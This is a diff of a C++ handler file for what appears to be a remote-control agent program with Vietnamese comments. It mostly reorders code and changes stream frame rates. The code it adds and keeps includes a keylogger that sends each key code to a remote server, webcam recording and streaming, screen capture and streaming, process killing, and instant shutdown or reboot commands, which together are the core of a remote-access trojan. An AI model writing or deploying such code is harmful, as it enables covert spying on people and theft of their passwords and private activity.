@@ -1,7 +1,8 @@
 #include "ProcessHandlers.h"
 #include "AgentTcpServer.h"
 
-// Processes
+// === PROCESS HANDLERS ===
+
 json ProcessHandlers::listProcesses(const json &)
 {
     auto list = ProcessManager::listProcesses();
@@ -37,7 +38,8 @@ json ProcessHandlers::stopProcessPid(const json &req)
     return {{"type", "status"}, {"success", ok}};
 }
 
-// Apps
+// === APPLICATION HANDLERS ===
+
 json ProcessHandlers::listApps(const json &)
 {
     auto apps = ProcessManager::listUserApplications();
@@ -67,7 +69,8 @@ json ProcessHandlers::stopApp(const json &req)
     return {{"type", "status"}, {"success", stop > 0}, {"stopped", stop}};
 }
 
-// ScreenShot
+// === SCREEN HANDLERS ===
+
 json ProcessHandlers::captureScreen(const json &)
 {
     std::string b64 = capture_screenshot_base64();
@@ -77,124 +80,9 @@ json ProcessHandlers::captureScreen(const json &)
     return {{"type", "screenshot"}, {"success", true}, {"data", b64}};
 }
 
-// Webcam Record
-// Biến toàn cục để giữ trạng thái của việc ghi hình, mặc dù
-// WebcamRecord hiện tại là static, chúng ta sẽ cần thay đổi logic
-// để quản lý đa luồng tốt hơn.
-// Tạm thời, chúng ta sẽ sử dụng phương thức static `record_base64` cũ.
-// Gửi trạng thái "started" trước khi bắt đầu ghi hình
-json ProcessHandlers::startWebcamRecord(const json &req)
-{
-    int time = req.value("time", 10);
-
-    // Gửi trạng thái STARTED ngay lập tức
-    json status_msg = {
-        {"type", "webcam_recording_status"},
-        {"message", "Recording started. Duration: " + std::to_string(time) + "s"}};
-    AgentTcpServer::instance().sendJson(status_msg);
-
-    // Ghi hình và chờ (Blocking call)
-    std::string b64 = WebcamRecord::record_base64(time);
-
-    // Gửi trạng thái COMPLETED/FAILED sau khi kết thúc
-    if (b64.empty())
-    {
-        json failed_msg = {
-            {"type", "webcam_recording_status"},
-            {"message", "Recording failed"}};
-        AgentTcpServer::instance().sendJson(failed_msg);
-        return {{"type", "status"}, {"success", false}, {"message", "record failed"}};
-    }
-
-    // Gửi video đã mã hóa
-    json video_msg = {
-        {"type", "webcam_video"}, // Đổi thành webcam_video như Front-end đã xử lý
-        {"success", true},
-        {"data", b64}};
-    // Dùng sendJson của AgentTcpServer để gửi video ngay lập tức
-    AgentTcpServer::instance().sendJson(video_msg);
-
-    // Trả về status thành công, nhưng không có dữ liệu (vì đã gửi riêng)
-    return {{"type", "status"}, {"success", true}, {"message", "Webcam video sent."}};
-}
-
-// Hàm này sẽ không làm gì nhiều với WebcamRecord::record_base64 hiện tại vì nó là blocking.
-// Để có chức năng dừng thực sự, cần thay đổi WebcamRecord để dùng luồng và kiểm soát được.
-json ProcessHandlers::stopWebcamRecord(const json &)
-{
-    // Tạm thời, chỉ gửi trạng thái hủy bỏ về client.
-    // Logic dừng thực sự (kill FFmpeg thread) sẽ cần thay đổi WebcamRecord.cpp
-    json status_msg = {
-        {"type", "webcam_recording_status"},
-        {"message", "Recording cancelled (client request)"}};
-    AgentTcpServer::instance().sendJson(status_msg);
-    return {{"type", "status"}, {"success", true}, {"message", "Webcam stop signal sent."}};
-}
-
-// === SYSTEM CONTROL HANDLERS ===
-
-json ProcessHandlers::systemShutdown(const json &)
-{
-    // Lệnh tắt máy ngay lập tức, không có cảnh báo
-#ifdef _WIN32
-    // Windows: shutdown /s /t 0
-    std::system("shutdown /s /t 0");
-#else
-    // Linux/macOS: shutdown now
-    std::system("shutdown now");
-#endif
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "System shutdown command sent."}};
-}
-
-json ProcessHandlers::systemRestart(const json &)
-{
-    // Lệnh khởi động lại ngay lập tức, không có cảnh báo
-#ifdef _WIN32
-    // Windows: shutdown /r /t 0
-    std::system("shutdown /r /t 0");
-#else
-    // Linux/macOS: reboot
-    std::system("reboot");
-#endif
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "System restart command sent."}};
-}
-
-// === KEYLOGGER HANDLERS ===
-json ProcessHandlers::startKeylog(const json &)
-{
-    // đăng ký callback gửi phím lại đúng client đã bật keylog
-    setKeyEventCallback([](int key)
-                        {
-        json msg = {
-            {"type","key_event"},
-            {"key_code", key}
-        };
-
-        AgentTcpServer::instance().sendJson(msg); });
-
-    startKeylogger();
-
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "Keylogger started"}};
-}
-
-json ProcessHandlers::stopKeylog(const json &)
-{
-    stopKeylogger();
-    return {{"type", "status"}, {"success", true}, {"message", "Keylogger stopped"}};
-}
-
 json ProcessHandlers::startScreenStream(const json &req)
 {
-    int fps = req.value("fps", 60);
+    int fps = req.value("fps", 30);
     ScreenStream::start(fps);
 
     return {
@@ -212,13 +100,85 @@ json ProcessHandlers::stopScreenStream(const json &)
         {"message", "Screen streaming stopped"}};
 }
 
-// === WEBCAM STREAM HANDLERS MỚI ===
+// === KEYLOGGER HANDLERS ===
+
+json ProcessHandlers::startKeylog(const json &)
+{
+    // Đăng ký callback gửi phím lên Gateway
+    setKeyEventCallback([](int key)
+                        {
+        json msg = {
+            {"type","key_event"},
+            {"key_code", key}
+        };
+        AgentTcpServer::instance().sendJson(msg); });
+
+    startKeylogger();
+
+    return {
+        {"type", "status"},
+        {"success", true},
+        {"message", "Keylogger started"}};
+}
+
+json ProcessHandlers::stopKeylog(const json &)
+{
+    stopKeylogger();
+    return {{"type", "status"}, {"success", true}, {"message", "Keylogger stopped"}};
+}
+
+// === WEBCAM RECORD HANDLERS ===
+
+json ProcessHandlers::startWebcamRecord(const json &req)
+{
+    int time = req.value("time", 10);
+
+    // Gửi trạng thái bắt đầu ghi hình
+    json status_msg = {
+        {"type", "webcam_recording_status"},
+        {"message", "Recording started. Duration: " + std::to_string(time) + "s"}};
+    AgentTcpServer::instance().sendJson(status_msg);
+
+    // Ghi hình (blocking call)
+    std::string b64 = WebcamRecord::record_base64(time);
+
+    // Gửi trạng thái thất bại nếu ghi hình lỗi
+    if (b64.empty())
+    {
+        json failed_msg = {
+            {"type", "webcam_recording_status"},
+            {"message", "Recording failed"}};
+        AgentTcpServer::instance().sendJson(failed_msg);
+        return {{"type", "status"}, {"success", false}, {"message", "record failed"}};
+    }
+
+    // Gửi video đã mã hóa base64
+    json video_msg = {
+        {"type", "webcam_video"},
+        {"success", true},
+        {"data", b64}};
+    AgentTcpServer::instance().sendJson(video_msg);
+
+    return {{"type", "status"}, {"success", true}, {"message", "Webcam video sent."}};
+}
+
+// Hiện tại không thể dừng giữa chừng vì record_base64 là blocking
+json ProcessHandlers::stopWebcamRecord(const json &)
+{
+    json status_msg = {
+        {"type", "webcam_recording_status"},
+        {"message", "Recording cancelled (client request)"}};
+    AgentTcpServer::instance().sendJson(status_msg);
+    return {{"type", "status"}, {"success", true}, {"message", "Webcam stop signal sent."}};
+}
+
+// === WEBCAM STREAM HANDLERS ===
+
 json ProcessHandlers::startWebcamStream(const json &req)
 {
-    int fps = req.value("fps", 15);
-    WebcamStream::start(fps); // Bắt đầu luồng
+    int fps = req.value("fps", 30);
+    WebcamStream::start(fps);
 
-    // Gửi thông báo trạng thái về client (dùng type status cũ để cập nhật UI)
     json status_msg = {
         {"type", "webcam_recording_status"},
         {"message", "Webcam streaming started"}};
@@ -232,9 +192,8 @@ json ProcessHandlers::startWebcamStream(const json &req)
 
 json ProcessHandlers::stopWebcamStream(const json &)
 {
-    WebcamStream::stop(); // Dừng luồng
+    WebcamStream::stop();
 
-    // Gửi thông báo trạng thái về client (dùng type status cũ để cập nhật UI)
     json status_msg = {
         {"type", "webcam_recording_status"},
         {"message", "Webcam streaming stopped"}};
@@ -246,10 +205,30 @@ json ProcessHandlers::stopWebcamStream(const json &)
         {"message", "Webcam streaming stopped"}};
 }
 
-// Trả về danh sách tất cả command mà server hỗ trợ.
-json ProcessHandlers::help(const json &)
+// === SYSTEM CONTROL HANDLERS ===
+
+json ProcessHandlers::systemShutdown(const json &)
 {
+#ifdef _WIN32
+    std::system("shutdown /s /t 0");
+#else
+    std::system("shutdown now");
+#endif
     return {
-        {"type", "help"},
-        {"commands", {"list_processes", "start_process", "stop_process_pid", "list_applications", "start_application", "stop_application", "capture_screen", "start_keylog", "stop_keylog", "help"}}};
+        {"type", "status"},
+        {"success", true},
+        {"message", "System shutdown command sent."}};
+}
+
+json ProcessHandlers::systemRestart(const json &)
+{
+#ifdef _WIN32
+    std::system("shutdown /r /t 0");
+#else
+    std::system("reboot");
+#endif
+    return {
+        {"type", "status"},
+        {"success", true},
+        {"message", "System restart command sent."}};
 }
